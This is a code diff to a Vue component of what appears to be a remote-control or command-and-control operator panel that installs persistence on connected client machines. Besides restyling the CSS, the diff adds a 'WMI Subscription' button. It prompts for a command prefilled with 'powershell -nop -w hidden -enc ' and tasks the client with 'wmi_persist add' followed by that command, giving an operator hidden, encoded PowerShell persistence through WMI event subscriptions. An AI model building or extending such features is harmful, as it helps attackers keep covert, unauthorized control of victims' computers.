@@ -16,7 +16,6 @@
           <el-input
             v-model="customName"
             :placeholder="isZh ? '自定义名称（可选，默认 BladeShellSvc）' : 'Custom Name (optional, default BladeShellSvc)'"
-            size="small"
             style="width: 320px"
             clearable
           />
@@ -48,6 +47,13 @@
               @click="persist('startup')"
             >
               {{ loading === 'startup' ? (isZh ? '执行中...' : 'Running...') : (isZh ? '启动文件夹 (Startup Folder)' : 'Startup Folder') }}
+            </button>
+            <button
+              class="cs-btn cs-btn-primary"
+              :disabled="loading !== ''"
+              @click="promptWmiPersist"
+            >
+              {{ isZh ? 'WMI 事件订阅 (WMI)' : 'WMI Subscription' }}
             </button>
           </div>
           <div class="group-tip">
@@ -87,7 +93,7 @@
 
 <script setup lang="ts">
 import { computed, inject, ref } from 'vue'
-import { ElMessage } from 'element-plus'
+import { ElMessage, ElMessageBox } from 'element-plus'
 import ClientAPI from '@/api/clients'
 import { useI18nStore } from '@/stores/i18n'
 
@@ -102,6 +108,29 @@ const getUid = () => {
 
 const loading = ref('')
 const customName = ref('')
+
+function promptWmiPersist() {
+  const uid = getUid()
+  if (!uid) return
+  ElMessageBox.prompt(
+    isZh.value ? 'WMI 持久化触发命令:' : 'Command triggered by WMI persistence:',
+    isZh.value ? 'WMI 持久化' : 'WMI Persistence',
+    { confirmButtonText: isZh.value ? '添加' : 'Add', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputValue: 'powershell -nop -w hidden -enc ' },
+  ).then(async ({ value }) => {
+    const cmd = (value || '').trim()
+    if (!cmd) {
+      ElMessage.warning(isZh.value ? '命令为空' : 'Command is empty')
+      return
+    }
+    loading.value = 'wmi'
+    try {
+      await ClientAPI.send_commands({ uid, command: `wmi_persist add ${cmd}` })
+      ElMessage.success(isZh.value ? '已下发 WMI 持久化' : 'WMI persistence tasked')
+    } finally {
+      loading.value = ''
+    }
+  }).catch(() => {})
+}
 
 const persist = async (method: string) => {
   const uid = getUid()
@@ -128,68 +157,85 @@ const persist = async (method: string) => {
   height: 100%;
   display: flex;
   flex-direction: column;
-  background: var(--cs-panel);
-  overflow-y: auto;
+  background: var(--cs-bg);
+  overflow: hidden;
 }
 
 .cs-startup-toolbar {
-  height: 32px;
-  background: var(--cs-titlebar-bg);
-  border-bottom: 1px solid var(--cs-border);
+  height: 48px;
+  background: var(--cs-panel);
+  border-bottom: 1px solid var(--cs-card-border);
   display: flex;
   align-items: center;
-  padding: 0 12px;
+  padding: 0 16px;
   flex-shrink: 0;
 }
 
 .toolbar-title {
-  font-size: 12px;
-  font-weight: bold;
+  font-size: 14px;
+  font-weight: 600;
   color: var(--cs-text-bright);
 }
 
 .toolbar-hint {
-  font-size: 11px;
+  font-size: 13px;
   color: var(--cs-text-dim);
   margin-left: 12px;
 }
 
 .cs-startup-body {
-  padding: 14px 18px;
+  padding: 16px;
   display: flex;
   flex-direction: column;
-  gap: 14px;
-  max-width: 680px;
+  gap: 16px;
+  max-width: 760px;
   min-height: 320px;
+  width: 100%;
+  box-sizing: border-box;
+  overflow-y: auto;
+}
+
+.cs-startup-section {
+  background: var(--cs-card-bg);
+  border: 1px solid var(--cs-card-border);
+  border-radius: 8px;
+  padding: 16px;
 }
 
 .cs-form-row {
   display: flex;
   align-items: center;
-  gap: 10px;
+  gap: 12px;
 }
 
 .cs-form-label {
-  font-size: 12px;
+  font-size: 14px;
   color: var(--cs-text);
   font-weight: 500;
-  width: 140px;
+  width: 150px;
+  flex-shrink: 0;
 }
 
 .cs-group-box {
-  border: 1px solid var(--cs-border);
-  background: var(--cs-bg);
-  border-radius: 2px;
-  padding: 12px 14px;
+  background: var(--cs-card-bg);
+  border: 1px solid var(--cs-card-border);
+  border-radius: 8px;
+  overflow: hidden;
 }
 
 .group-title {
-  font-size: 12px;
+  height: 38px;
+  display: flex;
+  align-items: center;
+  padding: 0 12px;
+  font-size: 14px;
   font-weight: 600;
   color: var(--cs-text-bright);
-  margin-bottom: 10px;
-  border-bottom: 1px solid var(--cs-border);
-  padding-bottom: 4px;
+  border-bottom: 1px solid var(--cs-card-border);
+}
+
+.group-content {
+  padding: 12px;
 }
 
 .btn-grid {
@@ -199,9 +245,9 @@ const persist = async (method: string) => {
 }
 
 .group-tip {
-  margin-top: 10px;
-  font-size: 11px;
+  margin-top: 12px;
+  font-size: 13px;
   color: var(--cs-text-dim);
-  line-height: 1.5;
+  line-height: 1.6;
 }
 </style>
